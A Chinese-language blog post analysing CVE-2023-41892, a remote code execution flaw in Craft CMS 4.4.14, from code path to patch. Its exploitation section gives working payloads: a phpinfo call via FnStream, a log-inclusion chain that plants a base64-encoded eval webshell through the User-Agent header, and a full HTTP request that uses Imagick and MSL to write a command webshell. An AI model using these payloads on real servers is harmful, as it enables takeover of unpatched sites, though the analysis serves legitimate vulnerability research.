title: CVE-2023-41892 CraftCMS远程代码执行漏洞分析
author: Bmth
tags:
  - CVE-2023-41892
categories:
  - 漏洞分析
top_img: 'https://img-blog.csdnimg.cn/091bcd467d884b79b421b91ae5ab13fc.png'
cover: 'https://img-blog.csdnimg.cn/091bcd467d884b79b421b91ae5ab13fc.png'
date: 2023-09-26 22:16:00
---
![](https://img-blog.csdnimg.cn/091bcd467d884b79b421b91ae5ab13fc.png)

日常看看p神的知识星球有什么新trick，发现有人问了 craftcms 调用 imagick 写文件的方法，很经典的一个php原生类利用：[Exploiting Arbitrary Object Instantiations in PHP without Custom Classes](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)，但是实战一直没有遇到过，就趁这次机会好好学习一下

## 环境搭建
看到：[https://craftcms.com/docs/4.x/requirements.html](https://craftcms.com/docs/4.x/requirements.html)
![](https://img-blog.csdnimg.cn/c7eb971225764278949dd3fd01b12b9e.png)

需要使用php8以上版本，安装好所有的扩展，下载存在漏洞的版本：[https://github.com/craftcms/cms/releases/download/4.4.14/CraftCMS-4.4.14.zip](https://github.com/craftcms/cms/releases/download/4.4.14/CraftCMS-4.4.14.zip)

安装步骤：[https://craftcms.com/knowledge-base/first-time-setup](https://craftcms.com/knowledge-base/first-time-setup)
```
php craft setup
php craft serve
```
然后访问`http://127.0.0.1:8080/`即可看到成功安装

## 漏洞分析
官方通告：[https://github.com/craftcms/cms/security/advisories/GHSA-4w8r-3xrw-v25g](https://github.com/craftcms/cms/security/advisories/GHSA-4w8r-3xrw-v25g)

>Affected versions
\>= 4.0.0-RC1, <= 4.4.14

通过修复补丁可以看到存在漏洞的文件为：`src/controllers/ConditionsController.php`，触发点在 beforeAction 方法
在 yii 处理 Controller 的时候会自动调用该方法
![](https://img-blog.csdnimg.cn/484bafa49a0740db9830fe52c216a83b.png)

可以看到解析传入的参数，然后需要满足`createCondition($config)`，才能进入到 configure 方法
```php
$baseConfig = Json::decodeIfJson($this->request->getBodyParam('config'));
$config = $this->request->getBodyParam($baseConfig['name']);
$conditionsService->createCondition($config)
```
跟进到`src/services/Conditions.php`
![](https://img-blog.csdnimg.cn/c3ce2ce4bc2e4233bd280299152562d1.png)

获取变量`$class` ，不管这个值是数组还是字符串，都应该为 ConditionInterface 类的子类，否则直接抛出异常了
Ctrl+Alt+B 就可以看到所有的子类，随便取一个即可
![](https://img-blog.csdnimg.cn/53bfdb7c57884f85a4175f72c4a07948.png)

然后跟进到`yii\BaseYii::configure()`
![](https://img-blog.csdnimg.cn/94251e2c524d4cf5bd8139dc84d8ff68.png)

对一个不存在的成员变量赋值，会调用到`yii\base\Component::__set()`
![](https://img-blog.csdnimg.cn/386707e9bdde48b891865c5d06d7bbed.png)

注意到如果传入的键为`as `开头，就会调用到 createObject 方法
`yii\BaseYii::createObject()`
![](https://img-blog.csdnimg.cn/83b82b08e8554596a6fa52a199e7e871.png)

如果传入的参数存在键`__class`或者`class`，就会执行`static::$container->get($class, $params, $type)`
`yii\di\Container::get()`
![](https://img-blog.csdnimg.cn/ddd5cb8331e2464eaa449927d56896b6.png)

执行build方法进行类的创建，我们能够创建任意对象，并会调用该类的`__construct()`，在对象被销毁时则会调用`__destruct`方法

## 漏洞利用
全局查找`__construct`和`__destruct`，可以查找到所有能利用的类
### FnStream.php
`vendor\guzzlehttp\psr7\src\FnStream.php`

namespace 为 GuzzleHttp\Psr7
![](https://img-blog.csdnimg.cn/d538231f156b465aaaa9c5e16872473e.png)

我们可以对`_fn_close`变量赋值，在销毁时会触发 call_user_func 方法，可以执行phpinfo
![](https://img-blog.csdnimg.cn/a172782117804b4299a9958fdedcd7b7.png)

POST传参：
```json
action=conditions/render&configObject=craft\elements\conditions\ElementCondition&config={"name":"configObject","as ":{"class":"\\GuzzleHttp\\Psr7\\FnStream","__construct()":[{"close":null}],"_fn_close":"phpinfo"}}
```

### PhpManager.php
`vendor\yiisoft\yii2\rbac\PhpManager.php`

namespace 为 yii\rbac，是一个 require 文件包含
```
yii\base\BaseObject::__construct()
    yii\rbac\PhpManager::init()
        yii\rbac\PhpManager::load()
            yii\rbac\PhpManager::loadFromFile()
```
![](https://img-blog.csdnimg.cn/44b1cec62317466e80a0cb2251e43bb4.png)

那么马上就能想到包含日志文件，看到：[Logging | Craft CMS Documentation | 4.x](https://craftcms.com/docs/4.x/logging.html)
![](https://img-blog.csdnimg.cn/08c1ec41c75e479391205648eded981d.png)

在目录`storage/logs/`下存在文件`web-[Y-m-d].log`，按照年月日命名，里面存储了web的请求内容，我们直接包含这个文件即可
```json
action=conditions/render&configObject=craft\elements\conditions\ElementCondition&config={"name":"configObject","as ":{"class":"\\yii\\rbac\\PhpManager","__construct()":[{"itemFile":"/var/www/html/craft/storage/logs/web-2023-09-26.log"}]}}
```
User-Agent头传参防止被编码，第一次请求写入，第二次请求包含
![](https://img-blog.csdnimg.cn/506ca101b7614cb1ab29ed43d3055411.png)

由于单双引号会被反斜杠转义，考虑直接使用反引号命令执行
```
User-Agent: <?php `echo PD9waHAgQGV2YWwoJF9QT1NUWyJjbWQiXSk7Pz4=|base64 -d>shell.php`;?>
```

### Imagick
需要环境：php-imagick
我们可以想到原生类的利用：[任意代码执行下的php原生类利用](https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8B%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/)

看到 Imagick 类，它的构造函数只有一个参数，可以是字符串或字符串数组
![](https://img-blog.csdnimg.cn/8fd13c86cace4b5f8de876c00a2ead26.png)

一、MSL
MSL全称是Magick Scripting Language，它是一种内置的 ImageMagick 语言，其中存在两个标签`<read>`和`<write>`可以用于读取和写入文件，这个 Trick 的核心就是利用这两个标签写入任意文件Webshell
[https://imagemagick.org/script/conjure.php#msl](https://imagemagick.org/script/conjure.php#msl)

二、vid协议
ImageMagick中有一个协议vid：[https://github.com/ImageMagick/ImageMagick/blob/d2a918098878bd73a57a34b901b5ae85c0c8d17f/coders/vid.c#L98](https://github.com/ImageMagick/ImageMagick/blob/d2a918098878bd73a57a34b901b5ae85c0c8d17f/coders/vid.c#L98)，会调用 ExpandFilenames 函数
![](https://img-blog.csdnimg.cn/13f2cf958ff74fb5b59a8f767771682b.png)

可以用于包裹其他协议或者文件名，其增加了对 glob 通配符的支持，这样我们就可以通过`*`的方式来包含一些我们不知道完整文件名的文件

即使用`new Imagick('vid:msl:/tmp/php*');`让 Imagick 加载并解析 PHP 上传的临时文件

三、漏洞利用
1. `<read>`标签可以读取一个图片，图片可以来自于远程http，也可以来自于本地
2. `<write>`标签可以将前面获取的图片写入到另一个位置，而且文件名可控
3. `<comment>`标签可以给生成的图片加注释，所以我们将Webshell编码后放在这个标签里即可

一种方法就是利用本地图片，POC：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="/usr/share/doc/ImageMagick-7/www/wand.png"/>
<comment>HTML实体编码后的Webshell</comment>
<write filename="shell.php" />
</image>
```
还有一种方法就是使用`caption:`和`info:`协议

最后的请求如下：
```
POST /index.php HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Accept: */*
Host: 192.168.111.178:8080
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: multipart/form-data; boundary=--------------------------974726398307238472515955
Content-Length: 850

----------------------------974726398307238472515955
Content-Disposition: form-data; name="action"

conditions/render
----------------------------974726398307238472515955
Content-Disposition: form-data; name="configObject"

craft\elements\conditions\ElementCondition
----------------------------974726398307238472515955
Content-Disposition: form-data; name="config"

{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"vid:msl:/tmp/php*"}}}
----------------------------974726398307238472515955
Content-Disposition: form-data; name="image"; filename="poc.msl"
Content-Type: text/plain

<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="caption:&lt;?php system($_REQUEST['cmd']); ?&gt;"/>
<write filename="info:/var/www/html/craft/web/shell.php">
</image>
----------------------------974726398307238472515955--
```
虽然能成功写入，但是执行后会造成 **Segmentation fault (core dumped)** ，可能导致程序崩溃服务关闭，所以一般不建议使用该方法

参考：
[https://wx.zsxq.com/dweb2/index/topic_detail/411544512844188](https://wx.zsxq.com/dweb2/index/topic_detail/411544512844188)
[https://blog.calif.io/p/craftcms-rce](https://blog.calif.io/p/craftcms-rce)
[https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226](https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226)


## 漏洞修复
[https://github.com/craftcms/cms/commit/7359d18d46389ffac86c2af1e0cd59e37c298857](https://github.com/craftcms/cms/commit/7359d18d46389ffac86c2af1e0cd59e37c298857)
[https://github.com/craftcms/cms/commit/a270b928f3d34ad3bd953b81c304424edd57355e](https://github.com/craftcms/cms/commit/a270b928f3d34ad3bd953b81c304424edd57355e)

使用`Component::cleanseConfig`对传入的 config 进行处理
![](https://img-blog.csdnimg.cn/5d381cf36807427ab43909b2fc12508f.png)

移除所有以`on ` or `as ` 开头的键![](https://img-blog.csdnimg.cn/b7e813181e4449698bb250c3023bfc37.png)